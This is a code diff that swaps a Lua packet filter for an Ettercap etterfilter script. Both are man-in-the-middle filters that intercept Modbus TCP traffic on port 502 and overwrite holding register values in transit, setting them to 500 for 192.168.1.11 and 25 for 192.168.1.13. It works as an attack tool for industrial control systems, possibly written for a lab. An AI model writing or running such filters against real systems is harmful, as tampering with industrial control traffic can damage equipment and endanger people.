@@ -1,39 +1,18 @@
--- modbus_filter.lua
-
--- Fonction de filtrage et modification des paquets Modbus
-function modbus_filter(packet)
-    if packet.ethertype == 0x0800 then  -- Vérifie que c'est un paquet IPv4
-        local src_ip = packet.ip_src
-        local dst_ip = packet.ip_dst
-
-        -- Filtrage des paquets Modbus entre 192.168.1.11 et 192.168.1.13
-        if src_ip == "192.168.1.11" and dst_ip == "192.168.1.13" then
-            -- Modifier le registre de holding de 192.168.1.11 (offset 0) à 500
-            local modbus_payload = packet.payload.string
-
-            -- Recherche de la séquence spécifique à modifier pour 192.168.1.11
-            local search_pattern_11 = "\x00\x06\x00\x00\x00\x06\x00\x03\x00\x00\x00\x01"
-            local replace_pattern_11 = "\x00\x06\x00\x00\x00\x03\x00\x01\xf4"
-
-            -- Recherche de la séquence spécifique à modifier pour 192.168.1.13
-            local search_pattern_13 = "\x00\x06\x00\x00\x00\x06\x00\x03\x00\x00\x00\x01"
-            local replace_pattern_13 = "\x00\x06\x00\x00\x00\x03\x00\x00\x19"
-
-            -- Effectuer les remplacements dans le payload Modbus
-            if modbus_payload:find(search_pattern_11) then
-                modbus_payload = modbus_payload:gsub(search_pattern_11, replace_pattern_11)
-            elseif modbus_payload:find(search_pattern_13) then
-                modbus_payload = modbus_payload:gsub(search_pattern_13, replace_pattern_13)
-            end
-
-            -- Mettre à jour le payload du paquet avec les modifications
-            packet.payload.string = modbus_payload
-        end
-
-        -- Retourner le paquet modifié ou non modifié
-        return packet
-    end
-end
-
--- Enregistrer la fonction comme un filtre pour Ettercap
-register_packet_filter(modbus_filter)
+if (ip.proto == TCP && tcp.dst == 502) {
+    if (ip.src == '192.168.1.11') {
+        if (DATA.data + 4 == "\x00\x03") {
+            if (DATA.data + 7 == "\x00\x00") {
+                DATA.data + 9 = "\x01\xf4";  # 500 in hexadecimal (01F4)
+                msg("Modbus holding register value for 192.168.1.11 set to 500");
+            }
+        }
+    }
+    else if (ip.src == '192.168.1.13') {
+        if (DATA.data + 4 == "\x00\x03") {
+            if (DATA.data + 7 == "\x00\x00") {
+                DATA.data + 9 = "\x00\x19";  # 25 in hexadecimal (0019)
+                msg("Modbus holding register value for 192.168.1.13 set to 25");
+            }
+        }
+    }
+}
